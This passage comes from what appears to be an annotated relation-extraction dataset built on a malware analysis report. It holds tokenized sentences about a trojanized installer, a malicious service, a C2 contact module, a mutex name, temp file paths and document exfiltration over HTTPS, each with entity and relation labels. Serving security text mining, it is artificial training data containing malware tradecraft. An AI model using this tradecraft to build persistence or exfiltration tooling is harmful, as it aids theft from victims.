"global_pos": [86, 86], "name": "dynamic analysis", "pos": [10, 12], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [94, 94], "name": "it", "pos": [2, 3], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [98, 98], "name": "winprint32.exe", "pos": [6, 7], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [115, 115], "name": "event", "pos": [1, 2], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [122, 122], "name": "C2 contact module", "pos": [8, 11], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [136, 136], "name": "components", "pos": [22, 23], "index": "14_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "EX", "evidence": [1], "t": 2, "h": 3}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2, 3, 4, 5], "h": 3, "t": 8}, {"r": "FR", "evidence": [3], "h": 5, "t": 6}, {"r": "RD", "evidence": [1, 2, 3, 4], "t": 2, "h": 7}, {"r": "FR", "evidence": [5], "h": 8, "t": 9}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 10}, {"r": "FR", "evidence": [6], "h": 10, "t": 11}, {"r": "FR", "evidence": [7], "t": 12, "h": 13}, {"r": "UK", "evidence": [7], "h": 13, "t": 14}]}, {"title": "641-17", "sents": [["The", "remaining", "modules", "are", "executed", "by", "rmaserv.exe", "when", "this", "executable", "will", "be", "executed", "as", "a", "service", "."], ["The", "malicious", "service", ":", "rmaserv.exe", "This", "binary", "has", "two", "main", "features", "."], ["If", "it", "is", "executed", "with", "the", "``", "help", "''", "parameter", ",", "it", "will", "install", "a", "service", "to", "execute", "itself", "as", "a", "service", "."], ["This", "parameter", "is", "used", "by", "the", "trojanized", "installer", "."], ["Consequently", ",", "the", "execution", "wo", "n't", "do", "anything", "and", "the", "dynamic", "analysis", "will", "be", "skewed", "."], ["First", ",", "it", "will", "launch", "the", "winprint32.exe", "executable", "(", "C2", "contact", "module", ")", "and", "then", "it", "will", "wait", "for", "an", "event", "."], ["This", "event", "is", "the", "mechanism", "used", "by", "the", "C2", "contact", "module", "to", "alert", "the", "service", "executable", "to", "perform", "the", "cleaning", "of", "all", "components", "."], ["C2", "contact", "module", ":", "winprint32.exe", "Regularly", ",", "the", "service", "checks", "if", "a", "user", "is", "logged", ",", "by", "checking", "if", "Explorer", "is", "running", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "modules", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "rmaserv.exe", "pos": [6, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "rmaserv.exe", "pos": [4, 5], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [30, 30], "name": "it", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "service", "pos": [15, 16], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [58, 58], "name": "trojanized installer", "pos": [6, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [64, 64], "name": "execution", "pos": [3, 4], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [71, 71], "name": "dynamic analysis", "pos": [10, 12], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [79, 79], "name": "it", "pos": [2, 3], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [83, 83], "name": "winprint32.exe", "pos": [6, 7], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [100, 100], "name": "event", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [107, 107], "name": "C2 contact module", "pos": [8, 11], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [121, 121], "name": "components", "pos": [22, 23], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [123, 123], "name": "C2 contact module", "pos": [0, 3], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [131, 131], "name": "service", "pos": [8, 9], "index": "14_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 1, "t": 6}, {"r": "FR", "evidence": [2], "h": 3, "t": 4}, {"r": "RD", "evidence": [0, 1, 2, 3], "t": 0, "h": 5}, {"r": "FR", "evidence": [4], "h": 6, "t": 7}, {"r": "CO", "evidence": [4, 5], "h": 7, "t": 8}, {"r": "FR", "evidence": [5], "h": 8, "t": 9}, {"r": "FR", "evidence": [6], "t": 10, "h": 11}, {"r": "UK", "evidence": [6], "h": 11, "t": 12}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 13}, {"r": "CO", "evidence": [2, 3, 4, 5, 6, 7], "t": 4, "h": 14}]}, {"title": "641-18", "sents": [["The", "malicious", "service", ":", "rmaserv.exe", "This", "binary", "has", "two", "main", "features", "."], ["If", "it", "is", "executed", "with", "the", "``", "help", "''", "parameter", ",", "it", "will", "install", "a", "service", "to", "execute", "itself", "as", "a", "service", "."], ["This", "parameter", "is", "used", "by", "the", "trojanized", "installer", "."], ["Consequently", ",", "the", "execution", "wo", "n't", "do", "anything", "and", "the", "dynamic", "analysis", "will", "be", "skewed", "."], ["First", ",", "it", "will", "launch", "the", "winprint32.exe", "executable", "(", "C2", "contact", "module", ")", "and", "then", "it", "will", "wait", "for", "an", "event", "."], ["This", "event", "is", "the", "mechanism", "used", "by", "the", "C2", "contact", "module", "to", "alert", "the", "service", "executable", "to", "perform", "the", "cleaning", "of", "all", "components", "."], ["C2", "contact", "module", ":", "winprint32.exe", "Regularly", ",", "the", "service", "checks", "if", "a", "user", "is", "logged", ",", "by", "checking", "if", "Explorer", "is", "running", "."], ["Once", "explorer.exe", "is", "running", ",", "the", "service", "configures", "the", "environment", "and", "executes", "the", "C2", "contact", "module", ":", "winprint32.exe", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "rmaserv.exe", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [13, 13], "name": "it", "pos": [1, 2], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "service", "pos": [15, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [41, 41], "name": "trojanized installer", "pos": [6, 8], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [47, 47], "name": "execution", "pos": [3, 4], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [54, 54], "name": "dynamic analysis", "pos": [10, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [62, 62], "name": "it", "pos": [2, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [66, 66], "name": "winprint32.exe", "pos": [6, 7], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [83, 83], "name": "event", "pos": [1, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [90, 90], "name": "C2 contact module", "pos": [8, 11], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [104, 104], "name": "components", "pos": [22, 23], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [106, 106], "name": "C2 contact module", "pos": [0, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [114, 114], "name": "service", "pos": [8, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [130, 130], "name": "explorer.exe", "pos": [1, 2], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [135, 135], "name": "service", "pos": [6, 7], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [142, 142], "name": "C2 contact module", "pos": [13, 16], "index": "15_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 1, "t": 2}, {"r": "FR", "evidence": [3], "h": 4, "t": 5}, {"r": "CO", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "FR", "evidence": [4], "h": 6, "t": 7}, {"r": "FR", "evidence": [5], "t": 8, "h": 9}, {"r": "UK", "evidence": [5], "h": 9, "t": 10}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 11}, {"r": "CO", "evidence": [5, 6, 7], "h": 9, "t": 15}, {"r": "CO", "evidence": [6, 7], "h": 12, "t": 14}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6], "t": 2, "h": 12}, {"r": "EX", "evidence": [7], "t": 13, "h": 14}, {"r": "FR", "evidence": [7], "h": 14, "t": 15}]}, {"title": "641-19", "sents": [["If", "it", "is", "executed", "with", "the", "``", "help", "''", "parameter", ",", "it", "will", "install", "a", "service", "to", "execute", "itself", "as", "a", "service", "."], ["This", "parameter", "is", "used", "by", "the", "trojanized", "installer", "."], ["Consequently", ",", "the", "execution", "wo", "n't", "do", "anything", "and", "the", "dynamic", "analysis", "will", "be", "skewed", "."], ["First", ",", "it", "will", "launch", "the", "winprint32.exe", "executable", "(", "C2", "contact", "module", ")", "and", "then", "it", "will", "wait", "for", "an", "event", "."], ["This", "event", "is", "the", "mechanism", "used", "by", "the", "C2", "contact", "module", "to", "alert", "the", "service", "executable", "to", "perform", "the", "cleaning", "of", "all", "components", "."], ["C2", "contact", "module", ":", "winprint32.exe", "Regularly", ",", "the", "service", "checks", "if", "a", "user", "is", "logged", ",", "by", "checking", "if", "Explorer", "is", "running", "."], ["Once", "explorer.exe", "is", "running", ",", "the", "service", "configures", "the", "environment", "and", "executes", "the", "C2", "contact", "module", ":", "winprint32.exe", "."], ["This", "module", "is", "responsible", "for", "launching", "the", "document", "search", "module", ",", "contact", "the", "C2", "and", "exfiltrate", "the", "collected", "documents", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "it", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "service", "pos": [15, 16], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "trojanized installer", "pos": [6, 8], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [35, 35], "name": "execution", "pos": [3, 4], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "dynamic analysis", "pos": [10, 12], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [50, 50], "name": "it", "pos": [2, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [54, 54], "name": "winprint32.exe", "pos": [6, 7], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [71, 71], "name": "event", "pos": [1, 2], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "C2 contact module", "pos": [8, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [92, 92], "name": "components", "pos": [22, 23], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [94, 94], "name": "C2 contact module", "pos": [0, 3], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [102, 102], "name": "service", "pos": [8, 9], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [118, 118], "name": "explorer.exe", "pos": [1, 2], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [123, 123], "name": "service", "pos": [6, 7], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [130, 130], "name": "C2 contact module", "pos": [13, 16], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [137, 137], "name": "module", "pos": [1, 2], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [143, 143], "name": "document search module", "pos": [7, 10], "index": "16_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [149, 149], "name": "C2", "pos": [13, 14], "index": "17_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [153, 153], "name": "collected documents", "pos": [17, 19], "index": "18_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 2, "t": 17}, {"r": "RF", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 2, "t": 17}, {"r": "FR", "evidence": [2], "h": 3, "t": 4}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "FR", "evidence": [3], "h": 5, "t": 6}, {"r": "FR", "evidence": [4], "t": 7, "h": 8}, {"r": "UK", "evidence": [4], "h": 8, "t": 9}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 10}, {"r": "CO", "evidence": [4, 5, 6], "h": 8, "t": 14}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 8, "t": 15}, {"r": "CO", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "t": 1, "h": 11}, {"r": "EX", "evidence": [6], "t": 12, "h": 13}, {"r": "FR", "evidence": [6], "h": 13, "t": 14}, {"r": "FR", "evidence": [7], "h": 15, "t": 16}, {"r": "ST", "evidence": [7], "h": 15, "t": 17}, {"r": "RF", "evidence": [7], "h": 15, "t": 17}, {"r": "WR", "evidence": [7], "h": 15, "t": 18}]}, {"title": "641-20", "sents": [["This", "parameter", "is", "used", "by", "the", "trojanized", "installer", "."], ["Consequently", ",", "the", "execution", "wo", "n't", "do", "anything", "and", "the", "dynamic", "analysis", "will", "be", "skewed", "."], ["First", ",", "it", "will", "launch", "the", "winprint32.exe", "executable", "(", "C2", "contact", "module", ")", "and", "then", "it", "will", "wait", "for", "an", "event", "."], ["This", "event", "is", "the", "mechanism", "used", "by", "the", "C2", "contact", "module", "to", "alert", "the", "service", "executable", "to", "perform", "the", "cleaning", "of", "all", "components", "."], ["C2", "contact", "module", ":", "winprint32.exe", "Regularly", ",", "the", "service", "checks", "if", "a", "user", "is", "logged", ",", "by", "checking", "if", "Explorer", "is", "running", "."], ["Once", "explorer.exe", "is", "running", ",", "the", "service", "configures", "the", "environment", "and", "executes", "the", "C2", "contact", "module", ":", "winprint32.exe", "."], ["This", "module", "is", "responsible", "for", "launching", "the", "document", "search", "module", ",", "contact", "the", "C2", "and", "exfiltrate", "the", "collected", "documents", "."], ["It", "will", "create", "a", "mutex", "with", "the", "name", "``", "YeucqCcpgapiZISEdRSNiL", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "trojanized installer", "pos": [6, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [12, 12], "name": "execution", "pos": [3, 4], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "dynamic analysis", "pos": [10, 12], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [27, 27], "name": "it", "pos": [2, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [31, 31], "name": "winprint32.exe", "pos": [6, 7], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [48, 48], "name": "event", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [55, 55], "name": "C2 contact module", "pos": [8, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "components", "pos": [22, 23], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [71, 71], "name": "C2 contact module", "pos": [0, 3], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [79, 79], "name": "service", "pos": [8, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [95, 95], "name": "explorer.exe", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [100, 100], "name": "service", "pos": [6, 7], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [107, 107], "name": "C2 contact module", "pos": [13, 16], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [114, 114], "name": "module", "pos": [1, 2], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [120, 120], "name": "document search module", "pos": [7, 10], "index": "14_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [126, 126], "name": "C2", "pos": [13, 14], "index": "15_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [130, 130], "name": "collected documents", "pos": [17, 19], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [133, 133], "name": "It", "pos": [0, 1], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [142, 142], "name": "YeucqCcpgapiZISEdRSNiL", "pos": [9, 10], "index": "18_0"}]], "labels": [{"r": "ST", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 0, "t": 15}, {"r": "RF", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 0, "t": 15}, {"r": "FR", "evidence": [1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "FR", "evidence": [2], "h": 3, "t": 4}, {"r": "FR", "evidence": [3], "t": 5, "h": 6}, {"r": "UK", "evidence": [3], "h": 6, "t": 7}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "CO", "evidence": [3, 4, 5], "h": 6, "t": 12}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 6, "t": 13}, {"r": "CO", "evidence": [3, 4, 5, 6, 7], "h": 6, "t": 17}, {"r": "CO", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "EX", "evidence": [5], "t": 10, "h": 11}, {"r": "FR", "evidence": [5], "h": 11, "t": 12}, {"r": "FR", "evidence": [6], "h": 13, "t": 14}, {"r": "ST", "evidence": [6], "h": 13, "t": 15}, {"r": "RF", "evidence": [6], "h": 13, "t": 15}, {"r": "WR", "evidence": [6], "h": 13, "t": 16}, {"r": "WR", "evidence": [7], "h": 17, "t": 18}]}, {"title": "641-21", "sents": [["Consequently", ",", "the", "execution", "wo", "n't", "do", "anything", "and", "the", "dynamic", "analysis", "will", "be", "skewed", "."], ["First", ",", "it", "will", "launch", "the", "winprint32.exe", "executable", "(", "C2", "contact", "module", ")", "and", "then", "it", "will", "wait", "for", "an", "event", "."], ["This", "event", "is", "the", "mechanism", "used", "by", "the", "C2", "contact", "module", "to", "alert", "the", "service", "executable", "to", "perform", "the", "cleaning", "of", "all", "components", "."], ["C2", "contact", "module", ":", "winprint32.exe", "Regularly", ",", "the", "service", "checks", "if", "a", "user", "is", "logged", ",", "by", "checking", "if", "Explorer", "is", "running", "."], ["Once", "explorer.exe", "is", "running", ",", "the", "service", "configures", "the", "environment", "and", "executes", "the", "C2", "contact", "module", ":", "winprint32.exe", "."], ["This", "module", "is", "responsible", "for", "launching", "the", "document", "search", "module", ",", "contact", "the", "C2", "and", "exfiltrate", "the", "collected", "documents", "."], ["It", "will", "create", "a", "mutex", "with", "the", "name", "``", "YeucqCcpgapiZISEdRSNiL", "''", "."], ["Afterward", ",", "it", "will", "launch", "two", "processes", ":", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "C:", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "creation", "Then", ",", "it", "will", "start", "an", "infinite", "loop", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "execution", "pos": [3, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "dynamic analysis", "pos": [10, 12], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "it", "pos": [2, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "winprint32.exe", "pos": [6, 7], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [39, 39], "name": "event", "pos": [1, 2], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [46, 46], "name": "C2 contact module", "pos": [8, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [60, 60], "name": "components", "pos": [22, 23], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [62, 62], "name": "C2 contact module", "pos": [0, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [70, 70], "name": "service", "pos": [8, 9], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [86, 86], "name": "explorer.exe", "pos": [1, 2], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [91, 91], "name": "service", "pos": [6, 7], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [98, 98], "name": "C2 contact module", "pos": [13, 16], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [105, 105], "name": "module", "pos": [1, 2], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [111, 111], "name": "document search module", "pos": [7, 10], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [117, 117], "name": "C2", "pos": [13, 14], "index": "14_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [121, 121], "name": "collected documents", "pos": [17, 19], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [124, 124], "name": "It", "pos": [0, 1], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [133, 133], "name": "YeucqCcpgapiZISEdRSNiL", "pos": [9, 10], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [138, 138], "name": "it", "pos": [2, 3], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [144, 144], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "pos": [8, 15], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [151, 151], "name": "C: \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "pos": [15, 21], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [164, 164], "name": "infinite loop", "pos": [28, 30], "index": "21_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [2], "t": 4, "h": 5}, {"r": "UK", "evidence": [2], "h": 5, "t": 6}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 7}, {"r": "CO", "evidence": [2, 3, 4], "h": 5, "t": 11}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 5, "t": 12}, {"r": "CO", "evidence": [2, 3, 4, 5, 6], "h": 5, "t": 16}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "EX", "evidence": [4], "t": 9, "h": 10}, {"r": "FR", "evidence": [4], "h": 10, "t": 11}, {"r": "FR", "evidence": [5], "h": 12, "t": 13}, {"r": "ST", "evidence": [5], "h": 12, "t": 14}, {"r": "RF", "evidence": [5], "h": 12, "t": 14}, {"r": "WR", "evidence": [5], "h": 12, "t": 15}, {"r": "WR", "evidence": [6], "h": 16, "t": 17}, {"r": "FR", "evidence": [7], "h": 18, "t": 19}, {"r": "FR", "evidence": [7], "h": 18, "t": 20}, {"r": "FR", "evidence": [7], "h": 18, "t": 21}]}, {"title": "641-22", "sents": [["First", ",", "it", "will", "launch", "the", "winprint32.exe", "executable", "(", "C2", "contact", "module", ")", "and", "then", "it", "will", "wait", "for", "an", "event", "."], ["This", "event", "is", "the", "mechanism", "used", "by", "the", "C2", "contact", "module", "to", "alert", "the", "service", "executable", "to", "perform", "the", "cleaning", "of", "all", "components", "."], ["C2", "contact", "module", ":", "winprint32.exe", "Regularly", ",", "the", "service", "checks", "if", "a", "user", "is", "logged", ",", "by", "checking", "if", "Explorer", "is", "running", "."], ["Once", "explorer.exe", "is", "running", ",", "the", "service", "configures", "the", "environment", "and", "executes", "the", "C2", "contact", "module", ":", "winprint32.exe", "."], ["This", "module", "is", "responsible", "for", "launching", "the", "document", "search", "module", ",", "contact", "the", "C2", "and", "exfiltrate", "the", "collected", "documents", "."], ["It", "will", "create", "a", "mutex", "with", "the", "name", "``", "YeucqCcpgapiZISEdRSNiL", "''", "."], ["Afterward", ",", "it", "will", "launch", "two", "processes", ":", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "C:", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "creation", "Then", ",", "it", "will", "start", "an", "infinite", "loop", "."], ["The", "first", "step", "inside", "the", "loop", "is", "to", "contact", "the", "C2", "over", "HTTPS", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "it", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "winprint32.exe", "pos": [6, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "event", "pos": [1, 2], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "C2 contact module", "pos": [8, 11], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "components", "pos": [22, 23], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [46, 46], "name": "C2 contact module", "pos": [0, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [54, 54], "name": "service", "pos": [8, 9], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [70, 70], "name": "explorer.exe", "pos": [1, 2], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [75, 75], "name": "service", "pos": [6, 7], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [82, 82], "name": "C2 contact module", "pos": [13, 16], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "module", "pos": [1, 2], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [95, 95], "name": "document search module", "pos": [7, 10], "index": "11_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [101, 101], "name": "C2", "pos": [13, 14], "index": "12_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [105, 105], "name": "collected documents", "pos": [17, 19], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [108, 108], "name": "It", "pos": [0, 1], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [117, 117], "name": "YeucqCcpgapiZISEdRSNiL", "pos": [9, 10], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [122, 122], "name": "it", "pos": [2, 3], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [128, 128], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "pos": [8, 15], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [135, 135], "name": "C: \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "pos": [15, 21], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [148, 148], "name": "infinite loop", "pos": [28, 30], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [156, 156], "name": "loop", "pos": [5, 6], "index": "20_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [161, 161], "name": "C2", "pos": [10, 11], "index": "21_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "t": 2, "h": 3}, {"r": "UK", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 9}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 3, "t": 10}, {"r": "CO", "evidence": [1, 2, 3, 4, 5], "h": 3, "t": 14}, {"r": "CO", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "EX", "evidence": [3], "t": 7, "h": 8}, {"r": "FR", "evidence": [3], "h": 8, "t": 9}, {"r": "FR", "evidence": [4], "h": 10, "t": 11}, {"r": "ST", "evidence": [4], "h": 10, "t": 12}, {"r": "RF", "evidence": [4], "h": 10, "t": 12}, {"r": "WR", "evidence": [4], "h": 10, "t": 13}, {"r": "WR", "evidence": [5], "h": 14, "t": 15}, {"r": "FR", "evidence": [6], "h": 16, "t": 17}, {"r": "FR", "evidence": [6], "h": 16, "t": 18}, {"r": "FR", "evidence": [6], "h": 16, "t": 19}, {"r": "CO", "evidence": [6, 7], "h": 19, "t": 20}, {"r": "ST", "evidence": [7], "h": 20, "t": 21}, {"r": "RF", "evidence": [7], "h": 20, "t": 21}]}, {"title": "641-23", "sents": [["This", "event", "is", "the", "mechanism", "used", "by", "the", "C2", "contact", "module", "to", "alert", "the", "service", "executable", "to", "perform", "the", "cleaning", "of", "all", "components", "."], ["C2", "contact", "module", ":", "winprint32.exe", "Regularly", ",", "the", "service", "checks", "if", "a", "user", "is", "logged", ",", "by", "checking", "if", "Explorer", "is", "running", "."], ["Once", "explorer.exe", "is", "running", ",", "the", "service", "configures", "the", "environment", "and", "executes", "the", 